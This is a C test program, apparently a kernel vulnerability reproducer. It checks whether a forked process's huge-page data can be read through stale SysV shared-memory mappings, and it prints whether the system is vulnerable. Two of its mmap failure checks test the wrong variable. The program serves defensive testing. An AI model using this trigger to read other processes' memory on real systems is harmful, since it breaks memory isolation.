#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <setjmp.h>
#include <stdlib.h>
#include <signal.h>
#include <stdbool.h>
#include <unistd.h>
#include <stdio.h>

#define SHM_HUGE_SHIFT (26)
#define PMD_SIZE (1ull << 21)
#define PUD_SIZE (1ull << 30)
#define ALLOC_SIZE PUD_SIZE
#define PUD_MASK (~(PUD_SIZE - 1))

static sigjmp_buf mark;
volatile char *chan;

static void write_secret(void)
{
	volatile unsigned long *p;
	int r;

retry:
	while (*chan == 0);

	p = mmap(0, PMD_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_HUGETLB, 0, 0);
	if (p == MAP_FAILED) {
		perror("mmap");
		exit(1);
	}
	*p = 0xdeadbeef;

	while (*chan == 1);
	r = munmap((void *)p, PMD_SIZE);
	if (r != 0) {
		perror("munmap");
		exit(1);
	}
	if (*chan != 100) {
		*chan = 0;
		goto retry;
	}
	exit(1);
}

static void myhandler(int signum)
{
	printf("failed\n");
	*chan = 2;
	siglongjmp(mark, -1);
}

#define N_TRIES		(100)

int main(void)
{
	int shmflg, r, i, shm_id[2] = {-1, -1};
	key_t shm_key = ftok(".", 'x');
	struct sigaction myhandle;
	bool success = false;
	volatile unsigned long *p[2];
	unsigned long addr, v;
	int tries = 1;
	void *free_p;
	sigset_t mask;
	int ret = 0;

	// Find some valid range for our games
	free_p = mmap(0, ALLOC_SIZE*3, PROT_NONE, MAP_PRIVATE|MAP_ANON, 0, 0);
	if (p == MAP_FAILED) {
		perror("mmap");
		exit(1);
	}

	chan = mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, 0, 0);
	if (free_p == MAP_FAILED) {
		perror("mmap shared");
		exit(1);
	}
	munmap(free_p, ALLOC_SIZE*3);
	*chan = 0;

	if (fork() == 0)
		write_secret();

	sigemptyset(&mask);
	sigaddset(&mask, SIGSEGV);

	myhandle.sa_handler = myhandler;
	sigemptyset(&myhandle.sa_mask);
	myhandle.sa_flags = 0;
	r = sigaction(SIGSEGV, &myhandle, NULL);
	if (r < 0) {
		perror("sigaction");
		exit(1);
	}
	printf("starting test\n");
retry:
	if (sigsetjmp(mark, 0) == -1) {
		sigprocmask(SIG_UNBLOCK, &mask, NULL);
		if (++tries >= N_TRIES) {
			printf("not vulnerable\n");
			goto out;
		}
	}

	while (*chan != 0);

	addr = (unsigned long)free_p + (PUD_SIZE - 1) & PUD_MASK;

	shmflg = IPC_CREAT|0666|SHM_HUGETLB|(21 << SHM_HUGE_SHIFT);

	// Create two regions that alias each other
	for (i = 0; i < 2; i++) {
		shm_id[i] = shmget(shm_key, ALLOC_SIZE, shmflg);
		if (shm_id[i] < 0) {
			perror("shmget");
			goto err;
		}
		p[i] = (volatile unsigned long*)shmat(shm_id[i], (void *)addr, 0);

		if (p[i] == (void *)-1) {
			perror("shmat");
			goto err;
		}
		// fault it in
		*p[i] = 0;

		shmflg &= ~IPC_CREAT;
		addr += PUD_SIZE;
	}

	for (i = 0; i < 2; i++) {
		r = shmdt((void *)p[i]);
		if (r != 0) {
			perror("shmdt");
			goto err;
		}
		if (shm_id[i] >= 0)
			shmctl(shm_id[i], IPC_RMID, NULL);
		shm_id[i] = -1;
	}

	*chan = 1;

	for (volatile int i = 0; i < 100000000; i++) {
		if ((v = *p[0]) != 0)
			break;
	}

	printf("access succeeded on attempt (%d) when it should failed, reading: %lx\n", tries, v);
	ret = 1;
	goto out;
err:
	printf("unexpected error\n");

	for (i = 0; i < 2; i++) {
		if (shm_id[i] >= 0)
			shmctl(shm_id[i], IPC_RMID, NULL);
		shm_id[i] = -1;
	}
out:
	*chan = 100;
	return ret;
}
